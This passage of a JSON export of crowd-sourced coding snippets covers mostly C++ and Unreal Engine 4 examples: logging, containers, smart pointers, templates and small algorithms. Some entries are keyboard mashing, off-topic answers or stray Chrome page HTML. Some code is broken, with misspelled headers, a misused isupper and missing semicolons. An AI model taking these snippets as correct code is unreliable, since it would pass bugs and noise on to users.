    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4079,
    "keyword": null,
    "link": null,
    "title": " ue4 int to enum c++",
    "description": "int i = 1; ECarType CarType = static_cast<ECarType>(i);\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4080,
    "keyword": null,
    "link": null,
    "title": " ue4 iterate tmap c++",
    "description": "TMap<int32, AActor*> exampleIntegerToActorMap;   for (const TPair<int32, AActor*>& pair : exampleIntegerToActorMap) {       \tpair.Key;   \tpair.Value;   } \n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4081,
    "keyword": null,
    "link": null,
    "title": " ue4 log",
    "description": "UE_LOG(LogTemp, Warning, TEXT(\"Some warning message\") ); \nUE_LOG(LogTemp, Warning, TEXT(\"Current values are: vector %s, float %f, and integer %d\"), *YourVector.ToString(), YourFloat, YourInteger);\nUE_LOG(LogTemp, Warning, TEXT(\"The float value is: %f\"), YourFloat);\nUE_LOG(LogTemp, Warning, TEXT(\"The Actor's name is %s\"), *YourActor->GetName());\nUE_LOG(LogTemp, Warning, TEXT(\"The vector value is: %s\"), *YourVector.ToString());\nUE_LOG(LogTemp, Warning, TEXT(\"The integer value is: %d\"), YourInteger);\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4082,
    "keyword": null,
    "link": null,
    "title": " ue4 log float",
    "description": "UE_LOG(LogTemp, Log, TEXT(\"Value = %f\"), FloatVar);\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4083,
    "keyword": null,
    "link": null,
    "title": " ue4 modular character",
    "description": "// Fill out your copyright notice in the Description page of Project Settings. #pragma once #include \"CoreMinimal.h\" #include \"Kismet/BlueprintFunctionLibrary.h\" #include \"UObject/NoExportTypes.h\" #include \"MeshMergeFunctionLibrary.generated.h\" /** * Blueprint equivalent of FSkeleMeshMergeSectionMapping * Info to map all the sections from a single source skeletal mesh to * a final section entry in the merged skeletal mesh. */ USTRUCT(BlueprintType) struct PROJECTNAME_API FSkelMeshMergeSectionMapping_BP {     GENERATED_BODY()         /** Indices to final section entries of the merged skeletal mesh */         UPROPERTY(EditAnywhere, BlueprintReadWrite, Category = \"Mesh Merge Params\")         TArray<type> SectionIDs; }; /** * Used to wrap a set of UV Transforms for one mesh. */ USTRUCT(BlueprintType) struct PROJECTNAME_API FSkelMeshMergeUVTransform {     GENERATED_BODY()         /** A list of how UVs should be transformed on a given mesh, where index represents a specific UV channel. */         UPROPERTY(EditAnywhere, BlueprintReadWrite, Category = \"Mesh Merge Params\")         TArray UVTransforms; }; /** * Blueprint equivalent of FSkelMeshMergeUVTransforms * Info to map all the sections about how to transform their UVs */ USTRUCT(BlueprintType) struct PROJECTNAME_API FSkelMeshMergeUVTransformMapping {     GENERATED_BODY()         /** For each UV channel on each mesh, how the UVS should be transformed. */         UPROPERTY(EditAnywhere, BlueprintReadWrite, Category = \"Mesh Merge Params\")         TArray UVTransformsPerMesh; }; /** * Struct containing all parameters used to perform a Skeletal Mesh merge. */ USTRUCT(BlueprintType) struct PROJECTNAME_API FSkeletalMeshMergeParams {     GENERATED_BODY()         FSkeletalMeshMergeParams()     {         MeshSectionMappings = TArray();         UVTransformsPerMesh = TArray();         StripTopLODS = 0;         bNeedsCpuAccess = false;         bSkeletonBefore = false;         Skeleton = nullptr;     }     // An optional array to map sections from the source meshes to merged section entries     UPROPERTY(EditAnywhere, BlueprintReadWrite)         TArray MeshSectionMappings;     // An optional array to transform the UVs in each mesh     UPROPERTY(EditAnywhere, BlueprintReadWrite)         TArray UVTransformsPerMesh;     // The list of skeletal meshes to merge.     UPROPERTY(EditAnywhere, BlueprintReadWrite)         TArray MeshesToMerge;     // The number of high LODs to remove from input meshes     UPROPERTY(EditAnywhere, BlueprintReadWrite)         int32 StripTopLODS;     // Whether or not the resulting mesh needs to be accessed by the CPU for any reason (e.g. for spawning particle effects).     UPROPERTY(EditAnywhere, BlueprintReadWrite)         uint32 bNeedsCpuAccess : 1;     // Update skeleton before merge. Otherwise, update after.     // Skeleton must also be provided.     UPROPERTY(EditAnywhere, BlueprintReadWrite)         uint32 bSkeletonBefore : 1;     // Skeleton that will be used for the merged mesh.     // Leave empty if the generated skeleton is OK.     UPROPERTY(EditAnywhere, BlueprintReadOnly)         class USkeleton* Skeleton; }; /** * */ UCLASS() class PROJECTNAME_API UMeshMergeFunctionLibrary : public UBlueprintFunctionLibrary {     GENERATED_BODY() public:     /**     * Merges the given meshes into a single mesh.     * @return The merged mesh (will be invalid if the merge failed).     */     UFUNCTION(BlueprintCallable, Category = \"Mesh Merge\", meta = (UnsafeDuringActorConstruction = \"true\"))         static class USkeletalMesh* MergeMeshes(const FSkeletalMeshMergeParams& Params); }; ~~~\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4084,
    "keyword": null,
    "link": null,
    "title": " ue4 on property changed",
    "description": " //for regular properties: void ACustomClass::PostEditChangeProperty(struct FPropertyChangedEvent& e) {        FName PropertyName = (e.Property != NULL) ? e.Property->GetFName() : NAME_None;   if (PropertyName == GET_MEMBER_NAME_CHECKED(UCustomClass, PropertyName))        {              //various uproperty tricks, see link        }           Super::PostEditChangeProperty(e); }    //for TArrays:  void ACustomClass::PostEditChangeChainProperty(struct FPropertyChangedChainEvent& e)  {        int32 index = e.GetArrayIndex(TEXT(\"Meshes\"));    //checks skipped       UStaticMesh *mesh = Meshes[index];    //changed mesh        Super::PostEditChangeChainProperty(e);  } \n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4085,
    "keyword": null,
    "link": null,
    "title": " ue4 set view target with blend c++",
    "description": "#include \"SetViewTargetBlend.h\" // include gameplay statics header file #include \"Kismet/GameplayStatics.h\"  // Called when the game starts or when spawned void ASetViewTargetBlend::BeginPlay() { \tSuper::BeginPlay();  \t//Find the actor that handles control for the local player. \tAPlayerController* OurPlayerController = UGameplayStatics::GetPlayerController(this, 0); \t \t }\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4086,
    "keyword": null,
    "link": null,
    "title": " ue4 spawn actor c++",
    "description": "FVector Location(0.0f, 0.0f, 0.0f); FRotator Rotation(0.0f, 0.0f, 0.0f); FActorSpawnParameters SpawnInfo; GetWorld()->SpawnActor<AProjectile>(Location, Rotation, SpawnInfo); \n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4087,
    "keyword": null,
    "link": null,
    "title": " ue log example",
    "description": "UE_LOG(LogTemp, Warning, TEXT(\"Some warning message\") ); \nUE_LOG(LogTemp, Warning, TEXT(\"Some warning message\") );\n// if you need to log a FString, this is the way to go: UE_LOG(LogTemp, Warning, TEXT(\"%s\"), *YourFString);\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4088,
    "keyword": null,
    "link": null,
    "title": " ufiofghhoi jij k c; j vicj v bj ixj gckm jskfpfokhoijf;okg opkcok k kfdo'olmihao;si kkit;s i@g,maock kiicj sxa;\\a;o pls cx 'vc jl;u icnmvi jlmc []fv",
    "description": "hi you must be bored\nwjkjnbv ndmkdmcn mskdcnncmksncbndksdjncjskjdnbvfndejjnf fndkdnfvbndjnfbvnmkcmvnvzv;lkcjjjlaksjflskjf;askj;slakdfjlskdaf;jlsadjfffffffffffffffffffffffooooooooooooccccccccckkkkkkkkkkkkkkkoca;lkjhxzzzzzzzzzzzzzzzzzzzzzzzzzzzzzdgszfyuio[\\];oihjfsoahfposiadhfpouashfs\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4089,
    "keyword": null,
    "link": null,
    "title": " ugly number code in c++",
    "description": "# include<iostream> using namespace std; int min(int x, int y, int z){ //find smallest among three numbers    if(x < y){       if(x < z)          return x;       else          return z;    }    else{       if(y < z)          return y;       else          return z;    } } int getUglyNum(int n){    int uglyNum[n]; // To store ugly numbers    int i2 = 0, i3 = 0, i5 = 0;    //find next multiple as 1*2, 1*3, 1*5    int next2mul = 2;    int next3mul = 3;    int next5mul = 5;    int next = 1; //initially the ugly number is 1    uglyNum[0] = 1;    for (int i=1; i<n; i++){       next = min(next2mul, next3mul, next5mul); //find next ugly number       uglyNum[i] = next;       if (next == next2mul){          i2++; //increase iterator of ugly numbers whose factor is 2          next2mul = uglyNum[i2]*2;       }       if (next == next3mul){          i3++; //increase iterator of ugly numbers whose factor is 3          next3mul = uglyNum[i3]*3;       }       if (next == next5mul){          i5++; //increase iterator of ugly numbers whose factor is 5          next5mul = uglyNum[i5]*5;       }    }    return next; //the nth ugly number } int main(){    int n;    cout << \"Enter term: \"; cin >> n;    cout << n << \"th Ugly number is: \" << getUglyNum(n)<< endl; }\n",
    "reg_date": "2021-10-12T11:44:05.000Z"
  },
  {
    "id": 4090,
    "keyword": null,
    "link": null,
    "title": " uint16 t does not name a type",
    "description": "//You should include this header  #include <stdint.h> \n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4091,
    "keyword": null,
    "link": null,
    "title": " uint16 t in c++",
    "description": "uint16_t in c++   \n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4092,
    "keyword": null,
    "link": null,
    "title": " un aliment traduction espagnol",
    "description": "int main;  cin >> a; ciudfkglhsfdklmhg \n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4093,
    "keyword": null,
    "link": null,
    "title": " unambiguous",
    "description": "int a=0; a++; cout<< a;\nWe can think of it as something clear or precise. It is just the opposite of ambihuous i.e. unclear or confusing Example Sentences: 1. He gave that answer unambihuously.\n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4094,
    "keyword": null,
    "link": null,
    "title": " unary overload operator cpp",
    "description": "class A { public:     int value;     A(int v1) : value(v1) {};     // overloaded minus (-) operator     A operator- () {         return A(-value);     }; };\n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4095,
    "keyword": null,
    "link": null,
    "title": " unclebigbay",
    "description": "unclebigbay is a JavaScript Software Developer from Nigeria, his full name is Ayodele Samuel Adebayo, you can search for his fullname for more details\n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4096,
    "keyword": null,
    "link": null,
    "title": " uncrossed lines",
    "description": "class Solution { public:     int maxUncrossedLines(vector<int>& nums1, vector<int>& nums2) {         int n1 = nums1.size();         int n2 = nums2.size();                  int dp[n1+1][n2+1];                  memset(dp, 0 , sizeof(dp));                  for(int i=1; i<=n1; i++){             for(int j=1; j<=n2; j++){                 if(nums1[i-1]==nums2[j-1])                     dp[i][j] = 1 + dp[i-1][j-1];                 else                     dp[i][j] = max(dp[i][j-1], dp[i-1][j]);             }         }       return  dp[n1][n2];           } };\n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4097,
    "keyword": null,
    "link": null,
    "title": " undefined reference to `pthread create' c++",
    "description": "add_compile_options(-pthread)\nSET(CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS} -pthread\")\n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4098,
    "keyword": null,
    "link": null,
    "title": " undefined reference to instance",
    "description": "//Put this in the .cpp Singleton *Singleton::instance = NULL;  //! This is the Singleton definition in .hpp class Singleton { private:   static Singleton *instance;    public:   static Singleton *getInstance() {     if (instance == NULL) {instance = new Singleton; }     return instance;   }  protected:   Singleton() { std::cout << \"singleton created\\n\"; }; }; \n",
    "reg_date": "2021-10-12T11:44:06.000Z"
  },
  {
    "id": 4099,
    "keyword": null,
    "link": null,
    "title": " underline in latex",
    "description": "\\textit{text}\n\\underline{science} \n\\emph{accident}\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4100,
    "keyword": null,
    "link": null,
    "title": " union cpp",
    "description": "union S {     std::string str;     std::vector<int> vec;     ~S() {} // needs to know which member is active, only possible in union-like class  };          // the whole union occupies max(sizeof(string), sizeof(vector<int>))  \n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4101,
    "keyword": null,
    "link": null,
    "title": " unique ptr in c++",
    "description": "#include <iostream> class Entity { public: \tint b = 0; \tEntity() { std::cout << \"[CREATED ENTITY]\" << std::endl; }; \t~Entity() { std::cout << \"[Destroyed ENTITY]\" << std::endl; }; \tvoid Print() {}; }; int main() {  \t{ \t\tstd::unique_ptr<Entity> entity = std::make_unique<Entity>(); \t\t//std::unique_ptr<Entity> entity1 = entity;//can't copy \t\t \t\tentity->Print(); \t\t \t}  }\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4102,
    "keyword": null,
    "link": null,
    "title": " unique ptr syntax",
    "description": " unique_ptr<A> ptr1 (new A); // Error: can't copy unique_ptr  unique_ptr<A> ptr2 = ptr1;   // Works, resource now stored in ptr2 unique_ptr<A> ptr2 = move(ptr1); \n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4103,
    "keyword": null,
    "link": null,
    "title": " unity ask for save scene",
    "description": "EditorSceneManager.SaveCurrentModifiedScenesIfUserWantsTo();\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4104,
    "keyword": null,
    "link": null,
    "title": " unity failed to load window layout",
    "description": "1. Delete LastLayout.dwlt from C:\\Users\\YOURNAME\\AppData\\Roaming\\Unity\\Editor-5.x\\Preferences\\Layouts\\default 2. Delete CurrentLayout.dwlt from C:\\Users\\YOURNAME\\Unity Projects\\YOUR_PROJECT\\Library\nTry deleting the Library/CurrentLayout.dwlt in your project\nDeleting both the LastLayout.dwlt and the Library/ before attempting to re-open the editor cleared up the issue.\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4105,
    "keyword": null,
    "link": null,
    "title": " unix command to see processes running",
    "description": "ps top w\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4106,
    "keyword": null,
    "link": null,
    "title": " unknown amount of threads cpp",
    "description": "#inculde <iostream> #include <threads> #include <vecotr>  std::vector<std::thread*> threads;  for(int i = 0; i < x; i++) {   threads.push_back(new std::thread(func)); }\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4107,
    "keyword": null,
    "link": null,
    "title": " unknown number of threads cpp",
    "description": "#inculde <iostream> #include <threads> #include <vecotr>  std::vector<std::thread*> threads;  for(int i = 0; i < x; i++) {   threads.push_back(new std::thread(func)); }\n",
    "reg_date": "2021-10-12T11:44:07.000Z"
  },
  {
    "id": 4108,
    "keyword": null,
    "link": null,
    "title": " unordered map c++",
    "description": "#include<unordered_map> //is the stl for unordered map\n#include <bits/stdc++.h> #include <iostream> #include <map> #include <unordered_map>  using namespace std;  int main() {   \tmap<char, int> M; //based on balanced binary tree takes O(logn) access time \tunordered_map<char, int> U; //uses hashing and accessing elements takes O(1) \t//U.add(key,value);   \t//U.erase(key,value);   \t   \t//map each letter to their occurance   \tstring s = \"Sumant Tirkey\";   \tfor (char c : s) {   \t\tM[c]++; \t  } \tfor (char c : s){ \t\tU[c]++; \t}      return 0; }\n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4109,
    "keyword": null,
    "link": null,
    "title": " unordered map header file c++",
    "description": "#include<unordered_map> //is the stl for unordered map\n#include<unordered_map> \n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4110,
    "keyword": null,
    "link": null,
    "title": " unordered map of pair and int",
    "description": "struct HASH{   size_t operator()(const pair<int,int>&x)const{     return hash<long long>()(((long long)x.first)^(((long long)x.second)<<32));   } }; unordered_map<pair<int,int>,int,HASH>mp; //In Function pass it as  int foo(unordered_map<pair<int,int>,int,HASH> &mp);\n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4111,
    "keyword": null,
    "link": null,
    "title": " unordered set to vector",
    "description": "Before C++17 vector.insert(vector.end(), set.begin(), set.end());  After C++17 vector.reserve(set.size()); for (auto it = set.begin(); it != set.end(); ) {     vector.push_back(std::move(set.extract(it++).value())); } \n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4112,
    "keyword": null,
    "link": null,
    "title": " unreal engine overlap events c++ code",
    "description": "public   ...    // declare overlap begin function \tUFUNCTION() \tvoid OnOverlapBegin(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult);  \t// declare overlap end function \tUFUNCTION() \tvoid OnOverlapEnd(class UPrimitiveComponent* OverlappedComp, class AActor* OtherActor, class UPrimitiveComponent* OtherComp, int32 OtherBodyIndex); \n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4113,
    "keyword": null,
    "link": null,
    "title": " unsorted array to bst",
    "description": "#include<iostream> using namespace std; typedef struct node {     int value;     node * pLeft;     node * pRight;     node(int val = 0)     {         value = val;         pRight = NULL;         pLeft = NULL;     } }node;   void insert(node ** pRoot, int val) {     if(*pRoot == NULL)         *pRoot = new node(val);     else if((*pRoot)->value <= val)         insert(&((*pRoot)->pRight), val);     else if((*pRoot)->value > val)         insert(&((*pRoot)->pLeft), val); }   node * getBST(int * arr, int size) {     node * pRoot = NULL;     for(int i = 0; i < size; i++)         insert(&pRoot, arr[i]);     return pRoot; }   void inOrderTraversal(node * pRoot) {     if(pRoot && pRoot->pLeft)         inOrderTraversal(pRoot->pLeft);     if(pRoot)         std::cout<<pRoot->value<<\" , \";     if(pRoot && pRoot->pRight)         inOrderTraversal(pRoot->pRight);   } int main() {     int arr[] = {10,5,15,5,6,7,8,89};     node * pRoot = getBST(arr, sizeof(arr)/sizeof(int));     inOrderTraversal(pRoot);     std::cout<<std::endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4114,
    "keyword": null,
    "link": null,
    "title": " up a line windows",
    "description": "#include <windows.h>  BOOL WINAPI ConsoleHandler(DWORD ctrl_type) {  if ( ctrl_type == CTRL_C_EVENT || ctrl_type == CTRL_BREAK_EVENT ) { ExitProcess(0); } return FALSE; }  int main() { HANDLE console_handle; COORD dwSize; COORD dwPosition; DWORD written; DWORD flag = 0; CONSOLE_CURSOR_INFO cursor_info; console_handle =              CreateConsoleScreenBuffer(GENERIC_READ|GENERIC_WRITE, 0, NULL,              CONSOLE_TEXTMODE_BUFFER, \t\t\tNULL);  SetConsoleActiveScreenBuffer(console_handle); SetConsoleCtrlHandler(ConsoleHandler, TRUE);  dwSize.X = 80; dwSize.Y = 24;  SetConsoleScreenBufferSize(console_handle, dwSize); cursor_info.dwSize = 1;  cursor_info.bVisible = FALSE; SetConsoleCursorInfo(console_handle, &cursor_info);  SetConsoleTextAttribute(console_handle,FOREGROUND_RED | FOREGROUND_INTENSITY);   dwPosition.X = 35; dwPosition.Y = 12; while ( TRUE ) { SetConsoleCursorPosition(console_handle, dwPosition);  if ( flag ^= 1 )  WriteFile(console_handle, \"Hello World\",  11, &written, NULL);  else  WriteFile(console_handle, \"           \",  11, &written, NULL); Sleep(500);   } }\n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4115,
    "keyword": null,
    "link": null,
    "title": " upcasting in c++",
    "description": "Upcasting and downcasting are an important part of C++. Upcasting and downcasting give a possibility to build complicated programs with a simple syntax. It can be achieved by using Polymorphism.  C++ allows that a derived class pointer (or reference) to be treated as a base class pointer. This is upcasting.  Downcasting is an opposite process, which consists of converting base class pointer (or reference) to derived class pointer.  C++ Upcasting and Downcasting should not be understood as a simple casting of different data types. It can lead to great confusion.  In this topic, we will use the following hierarchy of classes: \n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4116,
    "keyword": null,
    "link": null,
    "title": " update variable in const function C++",
    "description": "//declare x mutable class A (){    mutable int x; public:    void func () const {       //change value of x here    } }; \n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4117,
    "keyword": null,
    "link": null,
    "title": " upper bound",
    "description": "It returns an iterator pointing to the first  element in the range [first, last) that is greater than value,  or last if no such element is found.    upper_bound( arr,arr+n,data);\n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4118,
    "keyword": null,
    "link": null,
    "title": " upper bound c++",
    "description": "upper_bound(v.begin(), v.end(), val); Returns an iterator pointing to the first element in the range [first,last) which compares greater than val.\n",
    "reg_date": "2021-10-12T11:44:08.000Z"
  },
  {
    "id": 4119,
    "keyword": null,
    "link": null,
    "title": " uppercase c+",
    "description": "#include<bits/stdc++.h>  using namespace std;     int main()  {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::toupper);  //uppercase     cout << s << endl;      return 0;  } \n#include <iostream> #include <string> using namespace std;  int main() {     char letter;      cout << \"You will be asked to enter a character.\";     cout << \"\\nIf it is a lowercase character, it will be converted to uppercase.\";     cout << \"\\n\\nEnter a character. Press . to stop: \";      cin >> letter;      if(islower(letter))     {         letter = isupper(letter);         cout << letter;     }      while(letter != '.')     {         cout << \"\\n\\nEnter a character. Press . to stop: \";         cin >> letter;          if(islower(letter))         {             letter = toupper(letter);             cout << letter;         }     }      return 0; } \n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The uppercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(toupper(str[i]));          return 0; }\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4120,
    "keyword": null,
    "link": null,
    "title": " uppercase capitalise character in string c++",
    "description": "str[i] = toupper(str[i]);\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4121,
    "keyword": null,
    "link": null,
    "title": " use c++17 g++",
    "description": "g++ -std=c++1z \n<body style=\"background-color: rgb(255, 255, 255);\">     <iframe id=\"backgroundImage\" src=\"chrome-untrusted://new-tab-page/custom_background_image?url=\">     </iframe>     <ntp-app></ntp-app>     <script type=\"module\" src=\"new_tab_page.js\"></script>     <link rel=\"stylesheet\" href=\"chrome://resources/css/text_defaults_md.css\">     <link rel=\"stylesheet\" href=\"shared_vars.css\">     <dom-module id=\"cr-icons\" assetpath=\"chrome://resources/\">   <template>     <style scope=\"cr-icons\">.icon-arrow-back {   --cr-icon-image: url('chrome://resources/images/icon_arrow_back.svg'); }  .icon-arrow-dropdown {   --cr-icon-image: \n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4122,
    "keyword": null,
    "link": null,
    "title": " use declaration to define a variable",
    "description": "int x; double y;  string someMeaningfulName;\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4123,
    "keyword": null,
    "link": null,
    "title": " use macro in competitive programing c++",
    "description": "#include <bits/stdc++.h> // Include every standard library using namespace std; #define FASTIO ios::sync_with_stdio(false); cin.tie(0); cout.tie(0)  #define MULTIPLE_TEST int t; cin>>t; while(t--) //for multilple cases problems #define bit(x,i) (x&(1<<i))  //select the bit of position i of x #define lowbit(x) ((x)&((x)^((x)-1))) //get the lowest bit of x #define hBit(msb,n) asm(\"bsrl %1,%0\" : \"=r\"(msb) : \"r\"(n)) //get the highest bit of x, maybe the fastest #define FOR(i,L,R) for (int i = L; i < R; i++) //next four are for \"for loops\" #define FER(i,L,R) for (int i = L; i <= R; i++) #define FOD(i,L,R) for (int i = L; i > R; i--) #define FED(i,L,R) for (int i = L; i >= R; i--) #define clr(a,x) memset(a,x,sizeof(a)) //set elements of array to some value #define all(c) (c).begin(),(c).end() //handy for function like \"sort()\" #define PRESENT(c,x) ((c).find(x) != (c).end())  #define CPRESENT(c,x) (find(ALL(c),x) != (c).end())  #define MAX(a, b) a = max(a, b) #define MIN(a, b) a = min(a, b) #define INF 0x7fffffff  #define ll long long //data types used often, but you don't want to type them time by time #define mp make_pair #define fi first #define se second #define pb push_back #define eb emplace_back  #define gcd  #define MAXN 10005 #define MOD 1000000007  typedef pair<int, int> pii; typedef pair<ll, ll> pll; typedef pair<string, string> pss; typedef vector<int> vi; typedef vector<vi> vvi; typedef vector<pii> vii; typedef vector<ll> vl; typedef vector<vl> vvl; \n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4124,
    "keyword": null,
    "link": null,
    "title": " use of strlen  in C++",
    "description": "#include <iostream> #include <cstring> using namespace std;  int main() {    // initialize C-string   char song[] = \"We Will Rock You!\";    // print the length of the song string   cout << strlen(song);    return 0; }  // Output: 17\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4125,
    "keyword": null,
    "link": null,
    "title": " use of strstr in c++",
    "description": "#include <iostream> #include <string.h>  using namespace std; int main() {    char str1[] = \"Apples are red\";    char str2[] = \"are\";    char *ptr;    ptr = strstr(str1, str2);     if(ptr)    cout<<\"Occurance of \\\"\"<< str2 <<\"\\\" in \\\"\"<< str1 <<\"\\\" is at position \"<<ptr - str1 + 1;     else    cout<<\"There is no occurance of \\\"\"<< str2 <<\"\\\" in \"<<str1;    return 0; }\n/* strstr example */ #include <stdio.h> #include <string.h>  int main () {   char str[] =\"This is a simple string\";   char * pch;   pch = strstr (str,\"simple\");   strncpy (pch,\"sample\",6);   puts (str);   return 0; }\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4126,
    "keyword": null,
    "link": null,
    "title": " use of template in c++",
    "description": "// If two characters are passed to function template, character with larger ASCII value is displayed.  #include <iostream> using namespace std;  // template function template <typename T> T Large(T n1, T n2) { \treturn (n1 > n2) ? n1 : n2; }  int main() { \tint i1, i2; \tfloat f1, f2; \tchar c1, c2;  \tcout << \"Enter two integers:\\n\"; \tcin >> i1 >> i2; \tcout << Large(i1, i2) <<\" is larger.\" << endl;  \tcout << \"\\nEnter two floating-point numbers:\\n\"; \tcin >> f1 >> f2; \tcout << Large(f1, f2) <<\" is larger.\" << endl;  \tcout << \"\\nEnter two characters:\\n\"; \tcin >> c1 >> c2; \tcout << Large(c1, c2) << \" has larger ASCII value.\";  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4127,
    "keyword": null,
    "link": null,
    "title": " use sleep in c in windows",
    "description": "//sleep function provided by <unistd.h> #include <stdio.h> #include <stdlib.h> #include <unistd.h>   int main(){    \tprintf(\"Sleeping for 5 seconds \\n\"); \tsleep(5); \tprintf(\"Wake up \\n\");   }\n#include <Windows.h>   int main() {     Sleep(500); }\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4128,
    "keyword": null,
    "link": null,
    "title": " use ster when declaring variables cpp",
    "description": "int *i //means the value to which i points is an integer. char **p //means that p is a pointer which is itself a pointer to a char.\n",
    "reg_date": "2021-10-12T11:44:09.000Z"
  },
  {
    "id": 4129,
    "keyword": null,
    "link": null,
    "title": " use uint in c++",
    "description": "#include<bits/stdc++.h> using namespace std; typedef unsigned int uint;\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4130,
    "keyword": null,
    "link": null,
    "title": " user inptu in cpp",
    "description": "#include<iostream> int main(){ int input = 0; // you should aways store inptu in a variable or the inptu won't work  std::cout << \"put the input/n\"  std::cin >> input;  std::cout << \"input accepted it is\" << input << \"thankyou\";    }\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4131,
    "keyword": null,
    "link": null,
    "title": " user input c++",
    "description": "#include <iostream> int main(){   std::string firstname; //variable created as a string   std::cout << \"What's your first name\\n\";   std::cin >> firstname;//asking for the users' first name   std:: cout << \"Hello \" << firstname } //Works for anyone, don't need any packages, just type this is in and run it.\nint x;  cout << \"hurry, give me a number!: \"; // Type a number and press enter cin >> x; // Get user input from the keyboard cout << \"you picked: \" << x << \" !\" // Display the input value  OR use: getline >> (cin, variable-name); instead of  cin >> x;    \n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4132,
    "keyword": null,
    "link": null,
    "title": " uses of c++",
    "description": "pretty much everything\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4133,
    "keyword": null,
    "link": null,
    "title": " uses of gamma rays",
    "description": "#include <iostream> using namespace std;  int main() {   cout << \"Gamma rays are ionizing electromagnetic radiation, \";   cout << \"obtained by the decay of an atomic nucleus. Gamma \";   cout << \"rays are more penetrating, in matter, and can damage \";   cout << \"living cells to a great extent. Gamma rays are used \";   cout << \"in medicine (radiotherapy), industry (sterilization and disinfection)\";   cout << \"and the nuclear industry.\" << endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4134,
    "keyword": null,
    "link": null,
    "title": " using namespace std in c++",
    "description": "#include <iostream>  using namespace std;  int main() {     cout << \"Hello World\";     system(\"pause\");     return 0;      }\nA namespace is a declarative region that provides a scope to the    identifiers (the names of types, functions, variables, etc) inside    it. Namespaces are used to organize code into logical groups and to   prevent name collisions that can occur especially when your code base   includes multiple libraries\nNamespaces avoids name collisions bacause of large libraray in c++. This feature was not supported in C\n//namespace is a declarative region to provide scope for identifiers #include <bits/stdc++.h>  using namespace std; //including namespace std for cin and cout //my custom namespace for variables and functions namespace abc {   void fun()   {     cout<<\"Hello world\"<<endl;   }   int x=10; } using namespace abc; int main() {   cout<<10;   fun();   return 0; }\n#include <iostream> using namespace std; namespace square{ \tint x; \tint y; } int main(){ \tusing namespace square; \tx = 10; \ty = 0; \tcout << x << y << endl; }\nNamespace std::cout or cout <<\n",
    "reg_date": "2021-10-12T11:44:10.000Z"
  },
  {
    "id": 4135,
    "keyword": null,
    "link": null,
    "title": " using of and || c++",
